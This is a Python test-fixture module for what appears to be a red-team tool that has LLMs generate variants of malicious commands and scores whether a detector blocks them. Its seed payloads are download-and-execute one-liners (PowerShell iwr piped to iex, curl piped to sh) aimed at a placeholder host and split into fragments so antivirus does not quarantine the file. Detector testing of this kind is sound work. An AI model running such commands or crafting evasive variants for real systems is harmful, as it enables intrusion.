"""Fakes for G1 tests: an Ollama on httpx.MockTransport and a scorer.

A plain module (not ``conftest``) so ``tests/validate/conftest.py`` and this
never collide as ``import conftest``.
"""

from __future__ import annotations

import json
from collections.abc import Callable
from dataclasses import dataclass, field

import httpx

from redteam.gen_llm import ChatClient
from redteam.models import EngineVerdict, Seed, Shell, Variant


def J(*parts: str) -> str:
    """Assemble command-like test strings at runtime (CLAUDE.md: Defender
    quarantines files containing whole malicious keywords)."""
    return ''.join(parts)


DIGEST = 'ab' * 32
VERSION = '9.9.9'

Reply = Callable[[dict, int], str | httpx.Response]


@dataclass
class FakeOllama:
    """``reply(body, n)`` returns the assistant content (or a whole
    response) for the n-th chat request (0-based)."""

    reply: Reply
    models: tuple[str, ...] = ('primary:1b', 'backup:1b')
    requests: list[dict] = field(default_factory=list)

    def handler(self, request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == '/api/version':
            return httpx.Response(200, json={'version': VERSION})
        if path == '/api/tags':
            return httpx.Response(
                200,
                json={
                    'models': [
                        {'name': m, 'model': m, 'digest': DIGEST}
                        for m in self.models
                    ]
                },
            )
        if path == '/v1/chat/completions':
            body = json.loads(request.content)
            n = len(self.requests)
            self.requests.append(body)
            out = self.reply(body, n)
            if isinstance(out, httpx.Response):
                return out
            return httpx.Response(
                200,
                json={
                    'model': body['model'],
                    'choices': [
                        {
                            'index': 0,
                            'message': {'role': 'assistant', 'content': out},
                            'finish_reason': 'stop',
                        }
                    ],
                    'usage': {'prompt_tokens': 11, 'completion_tokens': 7},
                },
            )
        return httpx.Response(404)

    def client(self, model: str = 'primary:1b', **kw) -> ChatClient:
        return ChatClient(
            model, transport=httpx.MockTransport(self.handler), **kw
        )

    def user_prompts(self) -> list[str]:
        return [r['messages'][-1]['content'] for r in self.requests]


def variants_json(*items: tuple[str, str, str], **extra) -> str:
    return json.dumps(
        {
            'variants': [
                {'shell': s, 'payload': p, 'technique': t} for s, p, t in items
            ],
            **extra,
        }
    )


def make_seeds() -> list[Seed]:
    return [
        Seed(
            case_id='case.ps.one',
            shell=Shell.POWERSHELL,
            split='train',
            payload=J('i', 'wr http://example.invalid/a.ps1 | ', 'i', 'ex'),
        ),
        Seed(
            case_id='case.sh.two',
            shell=Shell.SH,
            split='train',
            payload=J('cu', 'rl -s http://example.invalid/b | s', 'h'),
        ),
    ]


class FakeScorer:
    """Blocks everything unless the payload contains ``bypass_marker``."""

    def __init__(self, bypass_marker: str | None = None) -> None:
        self.bypass_marker = bypass_marker
        self.calls: list[list[str]] = []

    def __call__(self, items: list[Variant]) -> list[EngineVerdict]:
        self.calls.append([v.id for v in items])
        out = []
        for v in items:
            bypass = self.bypass_marker and self.bypass_marker in v.payload
            out.append(
                EngineVerdict(
                    variant_id=v.id,
                    rules_rev='deadbeef',
                    action='allow' if bypass else 'quarantine',
                    level='none' if bypass else 'malicious',
                    risk_score=5 if bypass else 90 - len(out),
                    reason_ids=() if bypass else ('cmd.fake-rule', 'ps.x'),
                    duration_us=100,
                )
            )
        return out
